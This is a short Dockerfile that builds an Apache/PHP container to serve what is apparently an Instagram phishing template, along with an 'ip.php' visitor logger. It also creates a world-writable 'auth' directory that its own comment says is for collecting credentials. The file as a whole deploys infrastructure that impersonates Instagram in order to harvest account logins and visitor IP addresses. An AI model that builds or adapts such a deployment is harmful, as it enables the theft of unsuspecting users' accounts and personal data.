# Use PHP with Apache (better for web hosting)
FROM php:apache

# Copy your Instagram template to the web root
COPY .sites/instagram /var/www/html/
COPY .sites/ip.php /var/www/html/

# Create auth directory for credentials
RUN mkdir -p /var/www/html/auth && chmod 777 /var/www/html/auth

# Enable Apache modules
RUN a2enmod rewrite

# Set the default page to index.php
RUN mv /var/www/html/index.php /var/www/html/index.php.bak 2>/dev/null || true

EXPOSE 80

# Start Apache (default)
CMD ["apache2-foreground"]
